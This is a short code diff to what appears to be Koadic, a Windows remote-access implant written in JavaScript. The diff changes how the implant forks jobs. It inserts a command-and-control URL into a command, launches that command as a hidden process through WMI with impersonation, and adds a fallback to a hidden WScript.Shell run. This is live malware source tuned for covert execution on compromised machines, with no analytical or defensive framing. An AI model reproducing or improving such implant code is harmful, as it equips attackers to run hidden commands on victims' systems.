@@ -337,8 +337,14 @@ Koadic.work.fork = function(jobkey, fork32Bit)
         cmd = Koadic.file.get32BitFolder() + cmd;
 
     cmd = cmd.replace("***K***", Koadic.work.make_url(jobkey));
-    Koadic.WMI.createProcess(cmd);
-    //Koadic.WS.Run(cmd, 0, false);
+
+    try {
+
+      Koadic.WMI.createProcess(cmd);
+    } catch (e) {
+        Koadic.WS.Run(cmd, 0, false);
+    }
+    //
 }
 
 Koadic.http = {};
@@ -684,6 +690,7 @@ Koadic.WMI.createProcess = function(cmd)
     var pid = 0;
 
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+
     var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
     si.ShowWindow = SW_HIDE;
     si.CreateFlags = 16777216;
